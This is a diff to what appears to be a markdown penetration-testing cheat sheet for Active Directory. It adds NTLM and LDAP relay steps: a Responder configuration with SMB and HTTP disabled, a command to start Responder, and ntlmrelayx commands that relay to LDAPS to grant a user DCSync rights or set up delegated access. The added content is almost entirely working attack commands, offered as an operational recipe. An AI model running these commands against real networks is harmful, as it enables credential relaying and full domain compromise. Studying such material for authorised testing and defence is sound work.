@@ -421,7 +421,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
     
 </details>
 <details>
-  <summary> NetExec NTLM-relay </summary>   
+  <summary> NTLM-relay </summary>   
 
   ### Evaluate no smb-signing and create an IP txt file for NTLMRelayx
   ```shell
@@ -436,6 +436,52 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   ### go-secdump NTLM Relaying
   ```shell
   ./go-secdump --host <target> -n --relay
+  ```
+
+  ### Disbale SMB and HTTP in Responder.conf
+  ```shell
+  [Responder Core]
+
+  ; Servers to start
+  SQL = On
+  SMB = Off
+  RDP = On
+  Kerberos = On
+  FTP = On
+  POP = On
+  SMTP = On
+  IMAP = On
+  HTTP = Off
+  HTTPS = On
+  DNS = On
+  LDAP = On
+  DCERPC = On
+  WINRM = On
+  SNMP = Off
+  ```
+
+### Kicksart responder then
+  ```shell
+  sudo responder -I eth0 
+  ```
+</details>
+
+<details>
+  <summary> LDAP-relay </summary>   
+
+  ### Evaluate no ldap-signing and create an IP txt file for NTLMRelayx
+  ```shell
+  NetExec ldap <IPs> -d <Domain_Name> -u <AD_user> -p <AD_password> -M ldap-checker
+  ```
+
+  ### NTLMRelayx escalate user to Enterprise Admins (DCSync rights)
+  ```shell
+  sudo python3 ntlmrelayx.py -t ldaps://<target> --escalate-user <AD_user>
+  ```
+
+  ### NTLMRelayx delegate access
+  ```shell
+  sudo python3 ntlmrelayx.py -t ldaps://<target> --delegate access
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
